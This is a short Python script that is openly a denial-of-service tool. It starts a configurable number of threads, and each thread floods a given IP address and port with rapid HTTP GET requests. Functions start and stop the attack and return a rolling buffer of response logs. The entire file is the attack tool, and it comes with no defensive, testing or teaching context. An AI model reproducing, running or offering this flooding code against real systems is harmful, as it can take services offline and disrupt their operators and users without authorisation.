import threading
import time
import requests

attack_running = False
attack_threads = []
log_buffer = []
log_lock = threading.Lock()


def start_attack(ip, port, num_threads):
    global attack_running, attack_threads
    attack_running = True
    attack_threads = []

    url = f"http://{ip}:{port}"
    print(f"[+] Starting DoS attack on {url} with {num_threads} threads")

    def attack_thread(thread_id):
        while attack_running:
            try:
                response = requests.get(url, timeout=1)
                log = f"[Thread {thread_id}] ✅ {response.status_code}"
            except Exception as e:
                log = f"[Thread {thread_id}] ❌ {str(e)}"
            print(log)  # 👈 Output to terminal
            with log_lock:
                log_buffer.append(log)
                if len(log_buffer) > 100:
                    log_buffer.pop(0)
            time.sleep(0.01)

    for i in range(num_threads):
        t = threading.Thread(target=attack_thread, args=(i,), daemon=True)
        attack_threads.append(t)
        t.start()


def stop_attack():
    global attack_running
    print("[!] Stopping DoS attack...")
    attack_running = False


def get_logs():
    with log_lock:
        return list(log_buffer)
